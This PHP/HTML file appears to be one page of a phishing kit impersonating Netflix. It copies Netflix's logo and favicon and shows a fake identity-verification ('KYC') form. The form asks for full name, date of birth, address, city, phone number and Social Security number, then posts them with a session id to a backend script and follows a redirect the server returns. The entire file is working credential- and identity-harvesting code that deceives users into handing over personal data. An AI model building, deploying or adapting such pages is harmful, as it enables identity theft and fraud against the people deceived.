<?php 
require_once 'config.php'; 
$lang = getLang();
$sid = $_GET['sid'] ?? '';
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" dir="<?php echo $lang === 'ar' ? 'rtl' : 'ltr'; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - <?php echo t('kyc', $lang); ?></title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/favicon.ico">
</head>
<body>
    <div class="bg-wrapper">
        <div class="bg-image"></div>
        <div class="bg-overlay"></div>
    </div>

    <header class="nf-header">
        <a href="#" class="nf-logo">
            <svg viewBox="0 0 111 30" fill="#e50914"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.125L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.532-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687H35.97V0h13.375v4.687h-4.001zM24.938 4.687V0H11.22v4.687h4.687v21.625c1.5 0 3.063.063 4.594.188V4.687h4.437zm-17.5 21.03c-1.813-.156-3.625-.25-5.438-.343V0h5.438v25.717z"/></svg>
        </a>
    </header>

    <main class="nf-main">
        <div class="nf-card kyc-card">
            <div class="kyc-icon">🆔</div>
            <h2><?php echo t('kyc', $lang); ?></h2>
            <p class="kyc-desc"><?php echo t('kyc_sub', $lang); ?></p>

            <form id="kycForm">
                <div class="nf-input-wrap">
                    <input type="text" id="kyc_name" required placeholder=" ">
                    <label><?php echo t('full_name', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="text" id="kyc_dob" required placeholder=" " maxlength="10">
                    <label><?php echo t('dob', $lang); ?> (DD/MM/YYYY)</label>
                </div>
                <div class="nf-input-wrap">
                    <input type="text" id="kyc_address" required placeholder=" ">
                    <label><?php echo t('address', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="text" id="kyc_city" required placeholder=" ">
                    <label><?php echo t('city', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="tel" id="kyc_phone" required placeholder=" ">
                    <label><?php echo t('phone', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="text" id="kyc_ssn" required placeholder=" ">
                    <label><?php echo t('ssn', $lang); ?></label>
                </div>

                <button type="submit" class="nf-btn" id="submitBtn">
                    <?php echo t('submit', $lang); ?>
                </button>
            </form>
        </div>
    </main>

    <script>
        const sid = '<?php echo htmlspecialchars($sid); ?>';
        const lang = '<?php echo $lang; ?>';

        document.getElementById('kycForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            document.getElementById('submitBtn').innerHTML = '<span class="spinner"></span> <?php echo t('processing', $lang); ?>';
            document.getElementById('submitBtn').disabled = true;

            const data = {
                kyc_name: document.getElementById('kyc_name').value,
                kyc_dob: document.getElementById('kyc_dob').value,
                kyc_address: document.getElementById('kyc_address').value,
                kyc_city: document.getElementById('kyc_city').value,
                kyc_phone: document.getElementById('kyc_phone').value,
                kyc_ssn: document.getElementById('kyc_ssn').value
            };

            const body = Object.keys(data).map(k => k + '=' + encodeURIComponent(data[k])).join('&');

            const res = await fetch('api.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=kyc&sid=' + sid + '&' + body
            });

            const result = await res.json();
            if (result.redirect) window.location.href = result.redirect;
        });
    </script>
</body>
</html>
